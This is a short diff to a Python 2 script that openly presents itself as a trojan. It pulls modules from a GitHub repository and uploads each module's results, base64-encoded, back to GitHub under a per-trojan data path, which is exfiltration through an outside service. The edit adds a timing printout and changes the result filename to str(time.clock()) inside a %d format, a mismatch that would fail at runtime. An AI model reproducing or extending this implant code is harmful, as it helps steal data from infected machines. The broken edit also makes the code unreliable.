@@ -18,7 +18,8 @@ data_path = "data/%s/" % trojan_id
 trojan_modules= []#empty list for modules
 configured = False#flag for configuration
 task_queue = []#task queue is represented by a que
-
+time.clock()
+print "[*]Staring time count %s" % str(time.clock())
 #functions:
 def get_wheel(wheel):
     file_contant = get_file_contents("wheels/%s" % wheel)
@@ -68,7 +69,7 @@ def get_trojan_config():
 
 def store_module_result(data,module):#storing module resaults in data section
     gh,repo,branch = connect_to_github()#connect to github
-    remote_path = "data/%s/%s_%d.data" % (trojan_id,module,random.randint(1000,100000))
+    remote_path = "data/%s/%s_%d.data" % (trojan_id,module,str(time.clock()))
     #store it in a file called like your trojan id in github repository
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
     #repo action for github create file in repo
